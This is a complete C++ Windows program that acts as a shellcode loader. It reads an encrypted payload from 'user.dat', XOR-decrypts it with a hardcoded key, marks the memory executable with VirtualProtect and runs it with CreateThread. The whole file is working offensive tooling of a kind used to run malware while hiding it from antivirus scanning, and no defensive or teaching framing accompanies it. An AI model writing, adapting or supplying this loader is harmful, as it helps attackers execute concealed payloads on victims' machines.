#include <Windows.h>
#include <iostream>

/*
    Performs a simple XOR encryption/decryption on a buffer.

    buffer      - Pointer to the data buffer to modify.
    bufferSize  - Size of the buffer.
    key         - XOR key.
    keySize     - Size of the XOR key.
*/
void XorBuffer(char* buffer, size_t bufferSize, const char* key, size_t keySize) {
    size_t keyIndex = 0;

    for (size_t i = 0; i < bufferSize; i++) {
        buffer[i] ^= key[keyIndex];
        keyIndex++;

        // If we reach the end of the key, wrap around
        if (keyIndex >= keySize - 1) {
            keyIndex = 0;
        }
    }
}

int main() {

    HANDLE fileHandle = nullptr;
    LARGE_INTEGER fileSize = { 0 };
    DWORD bytesRead = 0;
    DWORD oldProtection = 0;
    void* allocatedMemory = nullptr;
    BOOL protectResult = 0;
    HANDLE threadHandle = nullptr;

    // XOR key used to decrypt the shellcode
    const char xorKey[] = "key";

    // Open the encrypted payload file
    fileHandle = CreateFileA(
        "user.dat",
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (fileHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open user.dat" << std::endl;
        return -1;
    }

    // Retrieve the file size
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        std::cerr << "[-] Could not get file size." << std::endl;
        CloseHandle(fileHandle);
        return -1;
    }

    // Allocate RW memory for the encrypted payload
    allocatedMemory = VirtualAlloc(
        nullptr,
        fileSize.LowPart,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!allocatedMemory) {
        std::cerr << "[-] Memory allocation failed." << std::endl;
        CloseHandle(fileHandle);
        return -1;
    }

    // Read file contents into memory
    if (!ReadFile(fileHandle, allocatedMemory, fileSize.LowPart, &bytesRead, nullptr)) {
        std::cerr << "[-] Failed to read file into memory." << std::endl;
        CloseHandle(fileHandle);
        return -1;
    }

    CloseHandle(fileHandle);

    // Decrypt the buffer using XOR
    XorBuffer(
        reinterpret_cast<char*>(allocatedMemory),
        fileSize.LowPart,
        xorKey,
        sizeof(xorKey)
    );

    // Change memory protection to executable
    protectResult = VirtualProtect(
        allocatedMemory,
        fileSize.LowPart,
        PAGE_EXECUTE_READ,
        &oldProtection
    );

    if (!protectResult) {
        std::cerr << "[-] Failed to change memory protection." << std::endl;
        return -1;
    }

    // Execute the decrypted payload in a new thread
    threadHandle = CreateThread(
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(allocatedMemory),
        nullptr,
        0,
        nullptr
    );

    if (!threadHandle) {
        std::cerr << "[-] Failed to create execution thread." << std::endl;
        return -1;
    }

    // Wait for the thread (payload) to finish
    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);

    return 0;
}
